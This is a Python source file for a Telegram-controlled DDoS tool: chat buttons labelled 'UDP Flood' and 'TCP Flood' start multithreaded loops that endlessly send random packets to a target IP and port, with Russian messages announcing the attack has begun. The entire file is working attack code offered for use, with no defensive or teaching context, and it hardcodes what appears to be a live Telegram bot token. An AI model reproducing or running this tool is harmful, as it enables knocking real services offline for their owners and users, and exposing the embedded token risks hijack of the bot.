import argparse
import random
import socket
import threading
import telebot
from telebot import types

ap = argparse.ArgumentParser()
ap.add_argument("-i", "--ip", required=True, type=str, help="Host ip")
ap.add_argument("-p", "--port", required=True, type=int, help="Port")
ap.add_argument("-c", "--choice", type=str, default="y", help="UDP(y/n)")
ap.add_argument("-t", "--times", type=int, default=50000, help="Packets per one connection")
ap.add_argument("-th", "--threads", type=int, default=5, help="Threads")
args = vars(ap.parse_args())

ip = args['ip']
port = args['port']
choice = args['choice']
times = args['times']
threads = args['threads']

bot = telebot.TeleBot("6349839287:AAHdwQbGVdUIaBhZA9dK153X4BdABNnaUmk")

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(row_width=2)
    btn_udp = types.KeyboardButton('UDP Flood')
    btn_tcp = types.KeyboardButton('TCP Flood')
    markup.add(btn_udp, btn_tcp)
    bot.send_message(message.chat.id, "Выберите тип атаки:", reply_markup=markup)

@bot.message_handler(func=lambda message: True)
def process_message(message):
    if message.text == 'UDP Flood':
        run_threaded_attack('udp')
        bot.send_message(message.chat.id, "DDoS атака началась!")
    elif message.text == 'TCP Flood':
        run_threaded_attack('tcp')
        bot.send_message(message.chat.id, "DDoS атака началась!")
    else:
        bot.send_message(message.chat.id, "error")

def run_udp_attack():
    data = random._urandom(1024)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +" Sent!!!")
        except:
            print("[!] Error!!!")

def run_tcp_attack():
    data = random._urandom(16)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" Sent!!!")
        except:
            s.close()
            print("[*] Error")

def run_threaded_attack(attack_type):
    if attack_type == 'udp':
        for y in range(threads):
            th = threading.Thread(target = run_udp_attack)
            th.start()
    else:
        for y in range(threads):
            th = threading.Thread(target = run_tcp_attack)
            th.start()

bot.polling()
